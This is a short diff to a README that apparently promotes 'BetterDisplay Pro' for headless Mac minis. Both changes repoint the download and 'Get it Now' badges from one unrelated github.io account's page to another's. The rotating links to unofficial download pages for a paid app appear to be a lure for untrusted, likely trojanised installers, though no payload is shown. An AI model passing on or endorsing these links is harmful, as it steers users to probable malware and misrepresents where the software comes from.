@@ -5,7 +5,7 @@
 </p>
 
 <p align="center">
-  <a href="https://polycia-apps.github.io/.github/betterDisplayPro">
+  <a href="https://pasito2-pod.github.io/.github/betterDisplayPro">
     <img src="https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png" width="200" alt="Download BetterDisplay Pro"/>
   </a>
 </p>
@@ -81,7 +81,7 @@ The virtual display solution for headless Mac mini is one of those problems that
 
 <p align="center">
 
-[![Get it Now BetterDisplay Pro](https://img.shields.io/badge/Get_it_Now-023E8A?style=for-the-badge&logo=apple&logoColor=white)](https://polycia-apps.github.io/.github/betterDisplayPro)
+[![Get it Now BetterDisplay Pro](https://img.shields.io/badge/Get_it_Now-023E8A?style=for-the-badge&logo=apple&logoColor=white)](https://pasito2-pod.github.io/.github/betterDisplayPro)
 
 </p>
 
